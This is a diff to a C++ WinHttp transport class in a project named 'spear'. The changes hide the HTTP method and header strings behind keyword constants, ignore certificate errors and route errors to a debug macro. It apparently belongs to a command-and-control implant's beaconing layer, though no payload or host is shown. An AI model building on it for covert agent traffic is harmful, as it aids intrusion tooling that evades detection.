@@ -1,10 +1,11 @@
 #include <cwchar>
 #include <string>
-#include <iostream>
 
+#include "KeyWord.h"
+#include "DebugLog.h"
 #include "Instance.h"
-// #include "Obfuscation.h"
 #include "Transportion.h"
+
 
 namespace spear
 {
@@ -14,13 +15,13 @@ namespace spear
     /// @return 
     nlohmann::json Transporter::HttpGet(const std::wstring& uri)
     {
-        std::wstring tempHeader;
-        DWORD blockSize;
-        DWORD readSize;
+        DWORD          readSize;
+        DWORD          blockSize;
         nlohmann::json respone;
+        std::wstring   tempHeader;
         hRequest = Win32::WinHttpOpenRequest(
             hConnect,
-            L"GET",
+            Method.doGet,
             uri.c_str(),
             NULL,
             WINHTTP_NO_REFERER,
@@ -29,7 +30,7 @@ namespace spear
         );
         if (!hRequest)
         {
-            // std::cout << "[ERROR][Request][Get]: " << GetLastError() <<std::endl; // ! error
+            DEBUG_LOG("[ERROR][Request][Get]: ");
             return {};
         }
         
@@ -39,7 +40,7 @@ namespace spear
             SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
         if (!Win32::WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
         {
-            // std::cout << "[ERROR][Set][Get]: " << GetLastError() <<std::endl; // ! error
+            DEBUG_LOG("[ERROR][Request][Get]: ");
             Win32::WinHttpCloseHandle(hRequest);
             hRequest = NULL;
             return {};
@@ -77,7 +78,7 @@ namespace spear
             NULL, 0, NULL, 0, 0, 0
         ))
         {
-            // std::cout << "[ERROR][Send][Get]: " << GetLastError() <<std::endl; // ! error
+            DEBUG_LOG("[ERROR][Send][Get]: ");
             Win32::WinHttpCloseHandle(hRequest);
             hRequest = NULL;
             return {};
@@ -85,7 +86,7 @@ namespace spear
 
         if (!Win32::WinHttpReceiveResponse(hRequest, NULL))
         {
-            // std::cout << "[ERROR][ReceiveResponse][Get]: " << GetLastError() <<std::endl; // ! error
+            DEBUG_LOG("[ERROR][ReceiveResponse][Get]: ");
             Win32::WinHttpCloseHandle(hRequest);
             hRequest = NULL;
             return {};
@@ -93,7 +94,7 @@ namespace spear
 
         if (!Win32::WinHttpQueryDataAvailable(hRequest, &blockSize))
         {
-            // std::cout << "[ERROR][QueryDataAvailable][Get]: " << GetLastError() <<std::endl; // ! error
+            DEBUG_LOG("[ERROR][QueryDataAvailable][Get]: ");
             Win32::WinHttpCloseHandle(hRequest);
             hRequest = NULL;
             return {};
@@ -107,7 +108,7 @@ namespace spear
             &readSize
         ))
         {
-            // std::cout << "[ERROR][Read][Get]: " << GetLastError() <<std::endl; // ! error
+            DEBUG_LOG("[ERROR][Read][Get]: ");
             Win32::WinHttpCloseHandle(hRequest);
             hRequest = NULL;
             return {};
@@ -128,7 +129,7 @@ namespace spear
     {
         hRequest = Win32::WinHttpOpenRequest(
             hConnect,
-            L"POST",
+            Method.doPost,
             uri.c_str(),
             NULL,
             WINHTTP_NO_REFERER,
@@ -137,7 +138,7 @@ namespace spear
         );
         if (!hRequest)
         {
-            // std::cout << "[ERROR][Request][Post]: " << GetLastError() <<std::endl; // ! error
+            DEBUG_LOG("[ERROR][Request][Post]: ");
             return false;
         }
         
@@ -147,7 +148,7 @@ namespace spear
             SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
         if (!Win32::WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
         {
-            // std::cout << "[ERROR][Set][Post]: " << GetLastError() <<std::endl; // ! error
+            DEBUG_LOG("[ERROR][Set][Post]: ");
             Win32::WinHttpCloseHandle(hRequest);
             hRequest = NULL;
             return false;
@@ -155,14 +156,14 @@ namespace spear
 
         if (!Win32::WinHttpSendRequest(
             hRequest,
-            L"Content-Type: application/json",
+            headerKeyString,
             31,
             (LPVOID)data.dump().c_str(),
             data.dump().size(),
             data.dump().size(), 0
         ))
         {
-            std::cout << "[ERROR][Send][Post]: " << GetLastError() <<std::endl; // ! error
+            DEBUG_LOG("[ERROR][Send][Post]: ");
             Win32::WinHttpCloseHandle(hRequest);
             hRequest = NULL;
             return false;
@@ -181,13 +182,13 @@ namespace spear
         //     return false;
         // }
         
-        // if (!Win32::WinHttpReceiveResponse(hRequest, NULL))
-        // {
-        //     std::cout << "[ERROR][ReceiveResponse][Post]: " << GetLastError() <<std::endl; // ! error
-        //     Win32::WinHttpCloseHandle(hRequest);
-        //     hRequest = NULL;
-        //     return false;
-        // }
+        if (!Win32::WinHttpReceiveResponse(hRequest, NULL))
+        {
+            DEBUG_LOG("[ERROR][ReceiveResponse][Post]: ");
+            Win32::WinHttpCloseHandle(hRequest);
+            hRequest = NULL;
+            return false;
+        }
 
         Win32::WinHttpCloseHandle(hRequest);
         hRequest = NULL;
@@ -205,7 +206,7 @@ namespace spear
         );
         if (!hSession)
         {
-            // std::cerr << "[ERROR][Session]: " << GetLastError() << std::endl;
+            DEBUG_LOG("[ERROR][Session]: ");
             CloseAll();
             ExitProcess(1);
         }
@@ -218,7 +219,7 @@ namespace spear
         );
         if (!hSession)
         {
-            // std::cerr << "[ERROR][Connect]: " << GetLastError() << std::endl;
+            DEBUG_LOG("[ERROR][Connect]: ");
             CloseAll();
             ExitProcess(1);
         }
